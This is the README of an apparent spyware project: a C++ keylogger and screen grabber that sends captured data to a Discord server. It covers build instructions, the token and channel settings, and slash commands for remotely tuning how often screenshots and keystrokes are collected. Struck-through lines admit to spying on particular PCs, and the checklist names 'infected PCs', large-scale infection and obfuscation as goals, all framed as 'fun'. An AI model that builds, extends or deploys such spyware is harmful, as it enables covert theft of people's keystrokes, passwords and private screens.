A spyware with screen capture and keylogging capabilites and send back to Discord server made ~~to spy certain PC~~ for ***fun***.

~~Not sure if those PC are still being spyed or not...~~

### Dependencies

[C++ Discord API Bot Library - D++](https://github.com/brainboxdotcc/DPP)

### Build
Compile the sole mybot.cpp file, link with listed dependencies above (could be static or dynamic whatever)

Tested on both Mingw GCC and MSVC. Clang not tested

Define marcos value `EXTERNAL_BOT_TOKEN` for bot token, `GUILD_ID` for server id and `CHANNEL_ID` for channel id to which the data will be sent

### Discord splash command
- `/ping` : REST ping
- `/version`: Version and build info
- `/changehs <n>`: Set screen scan factor
- `/keytime <n>`: Set key data sending delay in minutes 
- `/bitmaptime <n>`: Set screenshot sending delay in seconds 

### Checklist
- ✅ ~~Collect many not-so-useful data from infected PCs~~
- ❌ Scan drives for external media (by querying Recent files)
- ❌ ~~Large-scale infection and better C2C capability~~
- ❌ Data hosting on a proper database    
- ❌ Basic/Advance obfuscation 
